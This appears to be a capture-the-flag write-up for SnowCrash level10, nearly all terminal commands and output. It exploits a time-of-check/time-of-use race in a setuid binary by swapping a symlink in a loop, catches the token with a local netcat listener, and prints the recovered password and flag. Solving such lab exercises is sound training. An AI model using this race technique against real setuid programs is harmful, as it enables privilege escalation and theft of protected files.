# Level10

```console
level10@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
d--x--x--x  1 root    users     340 Aug 30  2015 ..
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
-r-x------  1 level10 level10   675 Apr  3  2012 .profile
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

```console
level10@SnowCrash:~$ strings level10
open
access
...
%s file host
        sends file to host if you have access to it
Connecting to %s:6969 .. 
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file .. 
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
;*2$"
...
```

```console
level10@SnowCrash:~$ ltrace ./level10 token 127.0.0.1
__libc_start_main(0x80486d4, 3, 0xbffff6d4, 0x8048970, 0x80489e0 <unfinished ...>
access("token", 4)                            = -1
printf("You don't have access to %s\n", "token"You don't have access to token
) = 31
+++ exited (status 31) +++
```

```console
touch /tmp/false
chmod 777 /tmp/false
```

```console
nc -lk 6969 > /tmp/rebut.txt &
```

```console
while true; do ln -sf /tmp/false /tmp/link; ln -sf /home/user/level10/token /tmp/link; done &
```

```console
while true; do /home/user/level10/level10 /tmp/link 127.0.0.1; done &
```

10s després...
```console
cat /tmp/rebut.txt
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
...
```

```console
level10@SnowCrash:~$ su flag10
Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
```

```console
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```
